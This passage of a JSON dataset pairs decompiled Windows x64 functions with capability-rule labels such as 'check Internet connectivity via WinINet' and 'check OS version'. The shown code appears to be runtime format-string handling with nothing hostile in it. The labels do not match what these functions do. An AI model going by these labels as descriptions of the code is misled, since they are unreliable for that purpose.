pcVar8 = 0x3;\n                    }\n                }\n                *(arg1 + 0x34) = pcVar8;\n            }\ncode_r0x00014000ed81:\n            return CONCAT71(pcVar8 >> 8, 1);\n        }\n        iVar10 = *(arg1 + 8);\n        *(iVar10 + 0x30) = 1;\n        *(iVar10 + 0x2c) = 0x16;\n        uStack64 = 0x14000ec63;\n        uVar9 = fcn.14000bf58(0, 0, 0, 0);\n        return uVar9 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x00014000ed81;\n    arg1[0x24] = 7;\n    uStack56 = *0x14003e020 ^ &stack0xffffffffffffff88;\n    uVar1 = arg1[0x39];\n    uVar11 = 0x78;\n    if (uVar1 < 'e') {\n        if (uVar1 == 100) {\ncode_r0x00014000f03a:\n            *(arg1 + 0x28) = *(arg1 + 0x28) | 0x10;\ncode_r0x00014000f03e:\n            cVar6 = fcn.14000d418(arg1);\n        }\n        else {\n            if (uVar1 != 0x41) {\n                if (uVar1 == 0x43) {\ncode_r0x00014000efba:\n                    cVar6 = fcn.14000fd64(arg1);\n                }\n                else {\n                    if (uVar1 < 'E') goto code_r0x00014000f33d;\n                    if (uVar1 < 'H') goto code_r0x00014000f047;\n                    if (uVar1 == 0x53) {\ncode_r0x00014000effc:\n                        cVar6 = fcn.14000ffa0(arg1);\n                    }\n                    else {\n                        if (uVar1 == 0x58) goto code_r0x00014000efd0;\n                        if (uVar1 != 0x5a) {\n                            if (uVar1 != 0x61) {\n                                if (uVar1 != 99) goto code_r0x00014000f33d;\n                                goto code_r0x00014000efba;\n                            }\n                            goto code_r0x00014000f047;\n                        }\n                        cVar6 = fcn.14000f7c4(arg1);\n                    }\n                }\n                goto code_r0x00014000f04c;\n            }\ncode_r0x00014000f047:\n            cVar6 = fcn.14000f8b8(arg1);\n        }\n    }\n    else {\n        if (uVar1 < 'h') goto code_r0x00014000f047;\n        if (uVar1 == 0x69) goto code_r0x00014000f03a;\n        if (uVar1 == 0x6e) {\n            cVar6 = fcn.14000feec(arg1);\n        }\n        else if (uVar1 == 0x6f) {\n            if ((*(arg1 + 0x28) >> 5 & 1) != 0) {\n                *(arg1 + 0x28) = *(arg1 + 0x28) | 0x80;\n            }\n            cVar6 = fcn.14000d044(arg1);\n        }\n        else {\n            if (uVar1 == 0x70) {\n                *(arg1 + 0x30) = 0x10;\n                *(arg1 + 0x34) = 0xb;\n            }\n            else {\n                if (uVar1 == 0x73) goto code_r0x00014000effc;\n                if (uVar1 == 0x75) goto code_r0x00014000f03e;\n                if (uVar1 != 0x78) goto code_r0x00014000f33d;\n            }\ncode_r0x00014000efd0:\n            cVar6 = fcn.14000d7ec(arg1);\n        }\n    }\ncode_r0x00014000f04c:\n    if ((cVar6 == '\\0') || (arg1[0x38] != 0)) goto code_r0x00014000f33d;\n    uVar2 = *(arg1 + 0x28);\n    iVar10 = 0;\n    uStack72 = (uStack72 >> 0x10 & 0xff00) << 0x10;\n    if ((uVar2 >> 4 & 1) != 0) {\n        uStack72._1_3_ = uStack72 >> 8;\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) == 0) goto code_r0x00014000f0a4;\n                uStack72 = CONCAT31(uStack72._1_3_, 0x20);\n            }\n            else {\n                uStack72 = CONCAT31(uStack72._1_3_, 0x2b);\n            }\n        }\n        else {\n            uStack72 = CONCAT31(uStack72._1_3_, 0x2d);\n        }\n        iVar10 = 1;\n    }\ncode_r0x00014000f0a4:\n    uVar1 = arg1[0x39];\n    if (((uVar1 + 0xa8 & 0xdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar5 = true;\n    }\n    else {\n        bVar5 = false;\n    }\n    if ((bVar5) || ((uVar1 + 0xbf & 0xdf) == 0)) {\n        (&stack0xffffffffffffffb8)[iVar10] = 0x30;\n        if ((uVar1 == 0x58) || (uVar1 == 0x41)) {\n            uVar11 = 0x58;\n        }\n        (&stack0xffffffffffffffb9)[iVar10] = uVar11;\n        iVar10 = iVar10 + 2;\n    }\n    iVar13 = (*(arg1 + 0x2c) - *(arg1 + 0x48)) - iVar10;\n    if ((uVar2 & 0xc) == 0) {\n        uVar4 = *(arg1 + 8);\n        iVar12 = 0;\n        if (0 < iVar13) {\n            while ((((*(*(arg1 + 0x460) + 0x14) >> 0xc & 1) != 0 && (*(*(arg1 + 0x460) + 8) == 0)) ||\n                   (iVar7 = fcn.140010f8c(0x20, *(arg1 + 0x460), uVar4),  iVar7 != -1))) {\n                iVar7 = *(arg1 + 0x20);\n                *(arg1 + 0x20) = iVar7 + 1;\n                if ((iVar7 == -2) || (iVar12 = iVar12 + 1,  iVar13 <= iVar12)) goto code_r0x00014000f160;\n            }\n            *(arg1 + 0x20) = 0xffffffff;\n        }\n    }\ncode_r0x00014000f160:\n    arg1_00 = arg1 + 0x460;\n    arg4 = arg1 + 0x20;\n    if (((*(*arg1_00 + 0x14) >> 0xc & 1) == 0) || (*(*arg1_00 + 8) != 0)) {\n        uStack88 = *(arg1 + 8);\n        fcn.14001030c(arg1_00, &stack0xffffffffffffffb8, iVar10, arg4);\n    }\n    else {\n        *arg4 = *arg4 + iVar10;\n    }\n    if (((*(arg1 + 0x28) >> 3 & 1) != 0) && ((*(arg1 + 0x28) >> 2 & 1) == 0)) {\n        uVar4 = *(arg1 + 8);\n        iVar12 = 0;\n        if (0 < iVar13) {\n            while ((((*(*arg1_00 + 0x14) >> 0xc & 1) != 0 && (*(*arg1_00 + 8) == 0)) ||\n                   (iVar7 = fcn.140010f8c(0x30, *arg1_00, uVar4),  iVar7 != -1))) {\n                iVar7 = *arg4;\n                *arg4 = iVar7 + 1;\n                if ((iVar7 == -2) || (iVar12 = iVar12 + 1,  iVar13 <= iVar12)) goto code_r0x00014000f208;\n            }\n            *arg4 = -1;\n        }\n    }\ncode_r0x00014000f208:\n    if ((arg1[0x4c] == 0) || (*(arg1 + 0x48) < 1)) {\n        if (((*(*arg1_00 + 0x14) >> 0xc & 1) == 0) || (*(*arg1_00 + 8) != 0)) {\n            uStack88 = *(arg1 + 8);\n            fcn.14001030c(arg1_00, *(arg1 + 0x40), *(arg1 + 0x48), arg4);\n        }\n        else {\n            *arg4 = *arg4 + *(arg1 + 0x48);\n        }\n    }\n    else {\n        iVar12 = 0;\n        do {\n            uStack88 = *(arg1 + 8);\n            uStack72 = 0;\n            iVar7 = fcn.14001b88c(&stack0xffffffffffffffb8, &stack0xffffffffffffffbc, 6);\n            if ((iVar7 != 0) || (uStack72 == 0)) {\n                *arg4 = -1;\n                break;\n            }\n            if (((*(*arg1_00 + 0x14) >> 0xc & 1) == 0) || (*(*arg1_00 + 8) != 0)) {\n                uStack88 = *(arg1 + 8);\n                fcn.14001030c(arg1_00, &stack0xffffffffffffffbc, uStack72, arg4);\n            }\n            else {\n                *arg4 = *arg4 + uStack72;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 != *(arg1 + 0x48));\n    }\n    if ((-1 < *arg4) && ((*(arg1 + 0x28) >> 2 & 1) != 0)) {\n        uVar4 = *(arg1 + 8);\n        iVar12 = 0;\n        if (0 < iVar13) {\n            while ((((*(*arg1_00 + 0x14) >> 0xc & 1) != 0 && (*(*arg1_00 + 8) == 0)) ||\n                   (iVar7 = fcn.140010f8c(0x20, *arg1_00, uVar4),  iVar7 != -1))) {\n                iVar7 = *arg4;\n                *arg4 = iVar7 + 1;\n                if ((iVar7 == -2) || (iVar12 = iVar12 + 1,  iVar13 <= iVar12)) goto code_r0x00014000f33d;\n            }\n            *arg4 = -1;\n        }\n    }\ncode_r0x00014000f33d:\n    uVar9 = fcn.140005b20(uStack56 ^ &stack0xffffffffffffff88);\n    return uVar9;\n}\n",
        "token_count": 3571
    },
    "14000ef3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14000ef34(int64_t arg1)\n\n{\n    int32_t *arg4;\n    int64_t *arg1_00;\n    uint32_t uVar1;\n    ulong uVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t arg3;\n    uchar uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    ulong var_30h;\n    uchar auStack120 [32];\n    ulong uStack88;\n    uint uStack72;\n    uchar auStack68 [12];\n    uint64_t uStack56;\n    ulong var_bp_20h;\n    ulong var_bp_10h;\n    \n    uStack56 = *0x14003e020 ^ auStack120;\n    cVar4 = *(arg1 + 0x39);\n    uVar6 = 0x78;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x00014000f03a:\n            *(arg1 + 0x28) = *(arg1 + 0x28) | 0x10;\ncode_r0x00014000f03e:\n            cVar4 = fcn.14000d418(arg1);\n        }\n        else {\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') {\ncode_r0x00014000efba:\n                    cVar4 = fcn.14000fd64(arg1);\n                }\n                else {\n                    if (cVar4 < 'E') goto code_r0x00014000f33d;\n                    if (cVar4 < 'H') goto code_r0x00014000f047;\n                    if (cVar4 == 'S') {\ncode_r0x00014000effc:\n                        cVar4 = fcn.14000ffa0(arg1);\n                    }\n                    else {\n                        if (cVar4 == 'X') goto code_r0x00014000efd0;\n                        if (cVar4 != 'Z') {\n                            if (cVar4 != 'a') {\n                                if (cVar4 != 'c') goto code_r0x00014000f33d;\n                                goto code_r0x00014000efba;\n                            }\n                            goto code_r0x00014000f047;\n                        }\n                        cVar4 = fcn.14000f7c4(arg1);\n                    }\n                }\n                goto code_r0x00014000f04c;\n            }\ncode_r0x00014000f047:\n            cVar4 = fcn.14000f8b8(arg1);\n        }\n    }\n    else {\n        if (cVar4 < 'h') goto code_r0x00014000f047;\n        if (cVar4 == 'i') goto code_r0x00014000f03a;\n        if (cVar4 == 'n') {\n            cVar4 = fcn.14000feec(arg1);\n        }\n        else if (cVar4 == 'o') {\n            if ((*(arg1 + 0x28) >> 5 & 1) != 0) {\n                *(arg1 + 0x28) = *(arg1 + 0x28) | 0x80;\n            }\n            cVar4 = fcn.14000d044(arg1);\n        }\n        else {\n            if (cVar4 == 'p') {\n                *(arg1 + 0x30) = 0x10;\n                *(arg1 + 0x34) = 0xb;\n            }\n            else {\n                if (cVar4 == 's') goto code_r0x00014000effc;\n                if (cVar4 == 'u') goto code_r0x00014000f03e;\n                if (cVar4 != 'x') goto code_r0x00014000f33d;\n            }\ncode_r0x00014000efd0:\n            cVar4 = fcn.14000d7ec(arg1);\n        }\n    }\ncode_r0x00014000f04c:\n    if ((cVar4 == '\\0') || (*(arg1 + 0x38) != '\\0')) goto code_r0x00014000f33d;\n    uVar1 = *(arg1 + 0x28);\n    arg3 = 0;\n    uStack72 = (uStack72 >> 0x10 & 0xff00) << 0x10;\n    if ((uVar1 >> 4 & 1) != 0) {\n        uStack72._1_3_ = uStack72 >> 8;\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) == 0) goto code_r0x00014000f0a4;\n                uStack72 = CONCAT31(uStack72._1_3_, 0x20);\n            }\n            else {\n                uStack72 = CONCAT31(uStack72._1_3_, 0x2b);\n            }\n        }\n        else {\n            uStack72 = CONCAT31(uStack72._1_3_, 0x2d);\n        }\n        arg3 = 1;\n    }\ncode_r0x00014000f0a4:\n    cVar4 = *(arg1 + 0x39);\n    if (((cVar4 + 0xa8U & 0xdf) == 0) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((cVar4 + 0xbfU & 0xdf) == 0)) {\n        auStack68[arg3 + -4] = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar6 = 0x58;\n        }\n        auStack68[arg3 + -3] = uVar6;\n        arg3 = arg3 + 2;\n    }\n    iVar8 = (*(arg1 + 0x2c) - *(arg1 + 0x48)) - arg3;\n    if ((uVar1 & 0xc) == 0) {\n        uVar2 = *(arg1 + 8);\n        iVar7 = 0;\n        if (0 < iVar8) {\n            while ((((*(*(arg1 + 0x460) + 0x14) >> 0xc & 1) != 0 && (*(*(arg1 + 0x460) + 8) == 0)) ||\n                   (iVar5 = fcn.140010f8c(0x20, *(arg1 + 0x460), uVar2),  iVar5 != -1))) {\n                iVar5 = *(arg1 + 0x20);\n                *(arg1 + 0x20) = iVar5 + 1;\n                if ((iVar5 == -2) || (iVar7 = iVar7 + 1,  iVar8 <= iVar7)) goto code_r0x00014000f160;\n            }\n            *(arg1 + 0x20) = 0xffffffff;\n        }\n    }\ncode_r0x00014000f160:\n    arg1_00 = arg1 + 0x460;\n    arg4 = arg1 + 0x20;\n    if (((*(*arg1_00 + 0x14) >> 0xc & 1) == 0) || (*(*arg1_00 + 8) != 0)) {\n        uStack88 = *(arg1 + 8);\n        fcn.14001030c(arg1_00, &uStack72, arg3, arg4);\n    }\n    else {\n        *arg4 = *arg4 + arg3;\n    }\n    if (((*(arg1 + 0x28) >> 3 & 1) != 0) && ((*(arg1 + 0x28) >> 2 & 1) == 0)) {\n        uVar2 = *(arg1 + 8);\n        iVar7 = 0;\n        if (0 < iVar8) {\n            while ((((*(*arg1_00 + 0x14) >> 0xc & 1) != 0 && (*(*arg1_00 + 8) == 0)) ||\n                   (iVar5 = fcn.140010f8c(0x30, *arg1_00, uVar2),  iVar5 != -1))) {\n                iVar5 = *arg4;\n                *arg4 = iVar5 + 1;\n                if ((iVar5 == -2) || (iVar7 = iVar7 + 1,  iVar8 <= iVar7)) goto code_r0x00014000f208;\n            }\n            *arg4 = -1;\n        }\n    }\ncode_r0x00014000f208:\n    if ((*(arg1 + 0x4c) == '\\0') || (*(arg1 + 0x48) < 1)) {\n        if (((*(*arg1_00 + 0x14) >> 0xc & 1) == 0) || (*(*arg1_00 + 8) != 0)) {\n            uStack88 = *(arg1 + 8);\n            fcn.14001030c(arg1_00, *(arg1 + 0x40), *(arg1 + 0x48), arg4);\n        }\n        else {\n            *arg4 = *arg4 + *(arg1 + 0x48);\n        }\n    }\n    else {\n        iVar7 = 0;\n        do {\n            uStack88 = *(arg1 + 8);\n            uStack72 = 0;\n            iVar5 = fcn.14001b88c(&uStack72, auStack68, 6);\n            if ((iVar5 != 0) || (uStack72 == 0)) {\n                *arg4 = -1;\n                break;\n            }\n            if (((*(*arg1_00 + 0x14) >> 0xc & 1) == 0) || (*(*arg1_00 + 8) != 0)) {\n                uStack88 = *(arg1 + 8);\n                fcn.14001030c(arg1_00, auStack68, uStack72, arg4);\n            }\n            else {\n                *arg4 = *arg4 + uStack72;\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 != *(arg1 + 0x48));\n    }\n    if ((-1 < *arg4) && ((*(arg1 + 0x28) >> 2 & 1) != 0)) {\n        uVar2 = *(arg1 + 8);\n        iVar7 = 0;\n        if (0 < iVar8) {\n            while ((((*(*arg1_00 + 0x14) >> 0xc & 1) != 0 && (*(*arg1_00 + 8) == 0)) ||\n                   (iVar5 = fcn.140010f8c(0x20, *arg1_00, uVar2),  iVar5 != -1))) {\n                iVar5 = *arg4;\n                *arg4 = iVar5 + 1;\n                if ((iVar5 == -2) || (iVar7 = iVar7 + 1,  iVar8 <= iVar7)) goto code_r0x00014000f33d;\n            }\n            *arg4 = -1;\n        }\n    }\ncode_r0x00014000f33d:\n    fcn.140005b20(uStack56 ^ auStack120);\n    return;\n}\n",
        "token_count": 2614
    },
    "14000ed8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14000ed88(uint8_t *arg1)\n\n{\n    int32_t *arg4;\n    int64_t **arg1_00;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    char cVar5;\n    uint16_t uVar6;\n    uint16_t *puVar7;\n    uint64_t uVar8;\n    int32_t iVar9;\n    uint64_t arg3;\n    uint64_t uVar10;\n    int32_t iVar11;\n    ushort uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int64_t arg2;\n    uchar auStack120 [32];\n    ulong uStack88;\n    ushort uStack72;\n    uint uStack68;\n    uint64_t uStack64;\n    uint64_t uStack56;\n    \n    uVar6 = *(arg1 + 0x3a);\n    puVar7 = uVar6;\n    if (uVar6 != 0x46) {\n        if (uVar6 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x00014000ef2b;\n            arg1[0x24] = 8;\n        }\n        else if (*(arg1 + 0x34) == 0) {\n            if (uVar6 == 0x49) {\n                puVar2 = *(arg1 + 0x10);\n                uVar6 = *puVar2;\n                puVar7 = uVar6;\n                if (uVar6 == 0x33) {\n                    if (puVar2[1] == 0x32) {\n                        puVar7 = puVar2 + 2;\n                        *(arg1 + 0x34) = 10;\n                        *(arg1 + 0x10) = puVar7;\n                    }\n                }\n                else if (uVar6 == 0x36) {\n                    if (puVar2[1] == 0x34) {\n                        puVar7 = puVar2 + 2;\n                        *(arg1 + 0x34) = 0xb;\n                        *(arg1 + 0x10) = puVar7;\n                    }\n                }\n                else {\n                    puVar7 = uVar6 - 0x58;\n                    if ((uVar6 - 0x58 < 0x21) && ((0x120821001U >> (puVar7 & 0x3f) & 1) != 0)) {\n                        *(arg1 + 0x34) = 9;\n                    }\n                }\n            }\n            else if (uVar6 == 0x4c) {\n                *(arg1 + 0x34) = 8;\n            }\n            else if (uVar6 == 0x54) {\n                *(arg1 + 0x34) = 0xd;\n            }\n            else {\n                if (uVar6 == 0x68) {\n                    if (**(arg1 + 0x10) == 0x68) {\n                        *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                        puVar7 = 0x1;\n                    }\n                    else {\n                        puVar7 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar6 == 0x6a) {\n                        *(arg1 + 0x34) = 5;\n                        goto code_r0x00014000ef2b;\n                    }\n                    if (uVar6 != 0x6c) {\n                        if (uVar6 == 0x74) {\n                            *(arg1 + 0x34) = 7;\n                        }\n                        else if (uVar6 == 0x77) {\n                            *(arg1 + 0x34) = 0xc;\n                        }\n                        else if (uVar6 == 0x7a) {\n                            *(arg1 + 0x34) = 6;\n                        }\n                        goto code_r0x00014000ef2b;\n                    }\n                    if (**(arg1 + 0x10) == 0x6c) {\n                        *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                        puVar7 = 0x4;\n                    }\n                    else {\n                        puVar7 = 0x3;\n                    }\n                }\n                *(arg1 + 0x34) = puVar7;\n            }\ncode_r0x00014000ef2b:\n            return CONCAT71(puVar7 >> 8, 1);\n        }\n        iVar3 = *(arg1 + 8);\n        *(iVar3 + 0x30) = 1;\n        *(iVar3 + 0x2c) = 0x16;\n        uStack64 = 0x14000edec;\n        uVar8 = fcn.14000bf58(0, 0, 0, 0);\n        return uVar8 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x00014000ef2b;\n    arg1[0x24] = 7;\n    uStack56 = *0x14003e020 ^ &stack0xffffffffffffff88;\n    uVar6 = *(arg1 + 0x3a);\n    uVar12 = 0x78;\n    uVar8 = 1;\n    if (uVar6 < 0x65) {\n        if (uVar6 == 100) {\ncode_r0x00014000f48f:\n            *(arg1 + 0x28) = *(arg1 + 0x28) | 0x10;\ncode_r0x00014000f493:\n            cVar5 = fcn.14000d600(arg1);\n        }\n        else {\n            if (uVar6 != 0x41) {\n                if (uVar6 == 0x43) {\ncode_r0x00014000f3fb:\n                    cVar5 = fcn.14000fe28(arg1);\n                }\n                else {\n                    if (uVar6 < 0x45) goto code_r0x00014000f799;\n                    if (uVar6 < 0x48) goto code_r0x00014000f49c;\n                    if (uVar6 == 0x53) {\ncode_r0x00014000f451:\n                        cVar5 = fcn.140010038(arg1);\n                    }\n                    else {\n                        if (uVar6 == 0x58) goto code_r0x00014000f414;\n                        if (uVar6 != 0x5a) {\n                            if (uVar6 != 0x61) {\n                                if (uVar6 != 99) goto code_r0x00014000f799;\n                                goto code_r0x00014000f3fb;\n                            }\n                            goto code_r0x00014000f49c;\n                        }\n                        cVar5 = fcn.14000f83c(arg1);\n                    }\n                }\n                goto code_r0x00014000f4a1;\n            }\ncode_r0x00014000f49c:\n            cVar5 = fcn.14000fb04(arg1);\n        }\n    }\n    else {\n        if (uVar6 < 0x68) goto code_r0x00014000f49c;\n        if (uVar6 == 0x69) goto code_r0x00014000f48f;\n        if (uVar6 == 0x6e) {\n            cVar5 = fcn.14000feec(arg1);\n        }\n        else if (uVar6 == 0x6f) {\n            if ((*(arg1 + 0x28) >> 5 & 1) != 0) {\n                *(arg1 + 0x28) = *(arg1 + 0x28) | 0x80;\n            }\n            cVar5 = fcn.14000d22c(arg1);\n        }\n        else {\n            if (uVar6 == 0x70) {\n                *(arg1 + 0x30) = 0x10;\n                *(arg1 + 0x34) = 0xb;\n            }\n            else {\n                if (uVar6 == 0x73) goto code_r0x00014000f451;\n                if (uVar6 == 0x75) goto code_r0x00014000f493;\n                if (uVar6 != 0x78) goto code_r0x00014000f799;\n            }\ncode_r0x00014000f414:\n            cVar5 = fcn.14000d9d4(arg1);\n        }\n    }\ncode_r0x00014000f4a1:\n    uVar10 = 0;\n    if ((cVar5 == '\\0') || (arg1[0x38] != 0)) goto code_r0x00014000f799;\n    uVar14 = *(arg1 + 0x28);\n    uStack68 = 0;\n    uStack64 = uStack64 & 0xffffffffffff0000;\n    arg3 = uVar10;\n    if ((uVar14 >> 4 & 1) != 0) {\n        if ((uVar14 >> 6 & 1) == 0) {\n            if ((uVar14 & 1) == 0) {\n                arg3 = 0;\n                if ((uVar14 >> 1 & 1) != 0) {\n                    uStack68 = 0x20;\n                    arg3 = uVar8;\n                }\n                goto code_r0x00014000f50c;\n            }\n            uVar6 = 0x2b;\n        }\n        else {\n            uVar6 = 0x2d;\n        }\n        uStack68 = uVar6;\n        arg3 = uVar8;\n    }\ncode_r0x00014000f50c:\n    iVar1 = *(arg1 + 0x3a);\n    if (((iVar1 - 0x58U & 0xffdf) != 0) || ((uVar14 >> 5 & 1) == 0)) {\n        uVar8 = uVar10;\n    }\n    if ((uVar8 != '\\0') || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&stack0xffffffffffffffbc + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar12 = 0x58;\n        }\n        *(&stack0xffffffffffffffbe + arg3 * 2) = uVar12;\n        arg3 = arg3 + 2;\n    }\n    iVar11 = (*(arg1 + 0x2c) - arg3) - *(arg1 + 0x48);\n    if (((uVar14 & 0xc) == 0) && (0 < iVar11)) {\n        iVar9 = *(arg1 + 0x20);\n        uVar8 = uVar10;\n        do {\n            iVar3 = *(arg1 + 0x460);\n            if (*(iVar3 + 0x10) == *(iVar3 + 8)) {\n                if (*(iVar3 + 0x18) == '\\0') {\n                    iVar9 = -1;\n                }\n                else {\n                    iVar9 = iVar9 + 1;\n                }\n                *(arg1 + 0x20) = iVar9;\n            }\n            else {\n                *(arg1 + 0x20) = iVar9 + 1;\n                *(iVar3 + 0x10) = *(iVar3 + 0x10) + 1;\n                ***(arg1 + 0x460) = 0x20;\n                **(arg1 + 0x460) = **(arg1 + 0x460) + 2;\n                iVar9 = *(arg1 + 0x20);\n            }\n        } while ((iVar9 != -1) && (uVar14 = uVar8 + 1,  uVar8 = uVar14,  uVar14 < iVar11));\n    }\n    uStack88 = *(arg1 + 8);\n    arg4 = arg1 + 0x20;\n    arg1_00 = arg1 + 0x460;\n    fcn.140010264(arg1_00, &stack0xffffffffffffffbc, arg3, arg4);\n    if (((*(arg1 + 0x28) >> 3 & 1) != 0) && (((*(arg1 + 0x28) >> 2 & 1) == 0 && (0 < iVar11)))) {\n        iVar9 = *arg4;\n        uVar8 = uVar10;\n        do {\n            piVar4 = *arg1_00;\n            if (piVar4[2] == piVar4[1]) {\n                if (*(piVar4 + 3) == '\\0') {\n                    iVar9 = -1;\n                }\n                else {\n                    iVar9 = iVar9 + 1;\n                }\n                *arg4 = iVar9;\n            }\n            else {\n                *arg4 = iVar9 + 1;\n                piVar4[2] = piVar4[2] + 1;\n                ***arg1_00 = 0x30;\n                **arg1_00 = **arg1_00 + 2;\n                iVar9 = *arg4;\n            }\n        } while ((iVar9 != -1) && (uVar14 = uVar8 + 1,  uVar8 = uVar14,  uVar14 < iVar11));\n    }\n    if ((arg1[0x4c] == 0) && (iVar9 = *(arg1 + 0x48),  0 < iVar9)) {\n        iVar3 = *(arg1 + 8);\n        if (*(iVar3 + 0x28) == '\\0') {\n            fcn.140010150(iVar3);\n            iVar9 = *(arg1 + 0x48);\n        }\n        arg2 = *(arg1 + 0x40);\n        if (iVar9 != 0) {\n            do {\n                uStack72 = 0;\n                iVar9 = fcn.14001ba3c(&stack0xffffffffffffffb8, arg2, *(*(iVar3 + 0x18) + 8), *(arg1 + 8));\n                if (iVar9 < 1) {\n                    *(arg1 + 0x20) = 0xffffffff;\n                    break;\n                }\n                piVar4 = *arg1_00;\n                if (piVar4[2] == piVar4[1]) {\n                    if (*(piVar4 + 3) == '\\0') {\n                        *(arg1 + 0x20) = 0xffffffff;\n                    }\n                    else {\n                        *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                    }\n                }\n                else {\n                    *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                    piVar4[2] = piVar4[2] + 1;\n                    ***arg1_00 = uStack72;\n                    **arg1_00 = **arg1_00 + 2;\n                }\n                arg2 = arg2 + iVar9;\n                uVar14 = uVar10 + 1;\n                uVar10 = uVar14;\n            } while (uVar14 != *(arg1 + 0x48));\n        }\n    }\n    else {\n        uStack88 = *(arg1 + 8);\n        fcn.140010264(arg1_00, *(arg1 + 0x40), *(arg1 + 0x48), arg4);\n    }\n    iVar9 = *arg4;\n    if (((-1 < iVar9) && ((*(arg1 + 0x28) >> 2 & 1) != 0)) && (iVar13 = 0,  0 < iVar11)) {\n        do {\n            piVar4 = *arg1_00;\n            if (piVar4[2] == piVar4[1]) {\n                if (*(piVar4 + 3) == '\\0') {\n                    iVar9 = -1;\n                }\n                else {\n                    iVar9 = iVar9 + 1;\n                }\n                *arg4 = iVar9;\n            }\n            else {\n                *arg4 = iVar9 + 1;\n                piVar4[2] = piVar4[2] + 1;\n                ***arg1_00 = 0x20;\n                **arg1_00 = **arg1_00 + 2;\n                iVar9 = *arg4;\n            }\n        } while ((iVar9 != -1) && (iVar13 = iVar13 + 1,  iVar13 < iVar11));\n    }\ncode_r0x00014000f799:\n    uVar8 = fcn.140005b20(uStack56 ^ &stack0xffffffffffffff88);\n    return uVar8;\n}\n",
        "token_count": 3752
    },
    "14000f8b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000f8b8(int64_t arg1)\n\n{\n    uint8_t uVar1;\n    int64_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint8_t *puVar6;\n    char *pcVar7;\n    uint8_t *puVar8;\n    int64_t iVar9;\n    uint8_t uVar10;\n    uint64_t uVar11;\n    int64_t arg4;\n    bool bVar12;\n    ulong uStackX8;\n    \n    *(arg1 + 0x28) = *(arg1 + 0x28) | 0x10;\n    iVar4 = *(arg1 + 0x30);\n    if (iVar4 < 0) {\n        iVar4 = (-((*(arg1 + 0x39) + 0xbfU & 0xdf) != 0) & 0xfffffff9) + 0xd;\n        *(arg1 + 0x30) = iVar4;\n    }\n    else if ((iVar4 == 0) && ((*(arg1 + 0x39) == 'g' || (iVar4 = 0,  *(arg1 + 0x39) == 'G')))) {\n        *(arg1 + 0x30) = 1;\n        iVar4 = 1;\n    }\n    iVar9 = arg1 + 0x50;\n    cVar3 = fcn.14000c4a8(iVar9, iVar4 + 0x15d, *(arg1 + 8));\n    uVar11 = 0x200;\n    if (cVar3 == '\\0') {\n        if (*(arg1 + 0x458) == 0) {\n            iVar4 = 0x200;\n        }\n        else {\n            iVar4 = *(arg1 + 0x450) >> 1;\n        }\n        *(arg1 + 0x30) = iVar4 + -0x15d;\n    }\n    iVar5 = *(arg1 + 0x458);\n    if (*(arg1 + 0x458) == 0) {\n        iVar5 = iVar9;\n    }\n    *(arg1 + 0x40) = iVar5;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    iVar5 = *(arg1 + 0x458);\n    uStackX8 = *(*(arg1 + 0x18) + -8);\n    if (iVar5 == 0) {\n        arg4 = arg1 + 0x250;\n        iVar5 = iVar9;\n    }\n    else {\n        arg4 = (*(arg1 + 0x450) >> 1) + iVar5;\n        uVar11 = *(arg1 + 0x450) >> 1;\n    }\n    fcn.14001b5a4(&uStackX8, iVar5, uVar11, arg4);\n    if (((*(arg1 + 0x28) >> 5 & 1) != 0) && (*(arg1 + 0x30) == 0)) {\n        iVar9 = 